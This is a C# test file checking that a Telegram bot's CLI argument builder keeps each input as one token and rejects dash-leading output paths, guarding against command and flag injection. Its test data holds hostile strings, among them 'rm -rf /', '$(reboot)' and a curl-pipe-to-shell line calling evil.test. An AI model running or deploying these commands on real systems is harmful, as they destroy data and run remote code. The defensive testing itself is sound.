using Stencil.TelegramBot.Domain.Editing;
using Stencil.TelegramBot.Domain.Exceptions;
using Stencil.TelegramBot.Infrastructure.Cli;

namespace Stencil.TelegramBot.Tests;

/// <summary>argv is a token array handed to <c>ProcessStartInfo.ArgumentList</c> with <c>UseShellExecute=false</c>, so no shell parses it; the residual vector is flag injection through the positional output operand, which BuildArgv rejects (mirroring mcp's <c>args.rs</c>).</summary>
public sealed class CliArgvHardeningTests
{
    [Theory]
    [InlineData("--output")]
    [InlineData("-l/etc/passwd")]
    [InlineData("--album")]
    [InlineData("; rm -rf /")]
    [InlineData("$(reboot)")]
    [InlineData("`id`")]
    [InlineData("a.png && curl evil.test | sh")]
    public void Should_Keep_A_Hostile_Flag_Value_As_One_Operand_That_Cannot_Introduce_A_Flag(string hostile)
    {
        // input/crop/filter are flag *values*: whatever their content, each rides argv as exactly one element
        // after its own flag, so it can never become a separate flag or split into extra tokens.
        EditRequest req = new()
        {
            Input = hostile,
            CropSpec = hostile,
            Filter = hostile,
            Output = "out.png",
        };
        IReadOnlyList<string> argv = CliArgvBuilder.BuildArgv(req);

        int i = argv.ToList().IndexOf("-i");
        Assert.Equal(hostile, argv[i + 1]);
        int c = argv.ToList().IndexOf("-c");
        Assert.Equal(hostile.Trim(), argv[c + 1]); // CropSpec is trimmed; content otherwise intact
        int f = argv.ToList().IndexOf("--filter");
        Assert.Equal(hostile, argv[f + 1]);

        // No metacharacter ever produces an extra token: each hostile string is present as a
        // whole element, never a fragment of one.
        Assert.Equal(3, argv.Count(a => a == hostile || a == hostile.Trim()));
    }

    [Theory]
    [InlineData("--album")]
    [InlineData("-l")]
    [InlineData("-r")]
    [InlineData("--filter")]
    [InlineData("-")]
    [InlineData("--")]
    public void Should_Reject_A_Dash_Leading_Output_Without_Flag_Injection(string badOutput)
    {
        // The output is the positional operand and the CLI has no `--` terminator, so a
        // dash-leading output would be parsed as a flag. BuildArgv rejects it outright.
        EditRequest req = new()
        {
            Input = "a.png",
            Output = badOutput,
        };
        StencilCliException ex = Assert.Throws<StencilCliException>(() => CliArgvBuilder.BuildArgv(req));
        Assert.Contains("must not start with '-'", ex.Message);
    }

    [Theory]
    [InlineData("out.png")]
    [InlineData("./out.png")]
    [InlineData("sub/-weird.png")]
    [InlineData("a-b.png")]
    public void Should_Pass_Ordinary_Output_Paths_As_The_Final_Operand(string good)
    {
        EditRequest req = new()
        {
            Input = "a.png",
            Output = good,
        };
        IReadOnlyList<string> argv = CliArgvBuilder.BuildArgv(req);
        Assert.Equal(good, argv[^1]);
    }

    [Fact]
    public void Should_Return_A_Token_List_For_Argument_List_Without_A_Shell_From_Build_Argv()
    {
        // Structural: SpawnAsync feeds this list into ProcessStartInfo.ArgumentList with UseShellExecute=false,
        // never a joined string, so a space-bearing value staying one token here means nothing re-splits it.
        EditRequest req = new()
        {
            Input = "my file with spaces.png",
            Filter = "sepia and more",
            Output = "out dir/result.png",
        };
        IReadOnlyList<string> argv = CliArgvBuilder.BuildArgv(req);

        Assert.Contains("my file with spaces.png", argv);
        Assert.Contains("sepia and more", argv);
        Assert.Contains("out dir/result.png", argv);
        // Each space-bearing value is a single element — no token was split on whitespace.
        Assert.Equal(1, argv.Count(a => a == "my file with spaces.png"));
    }
}
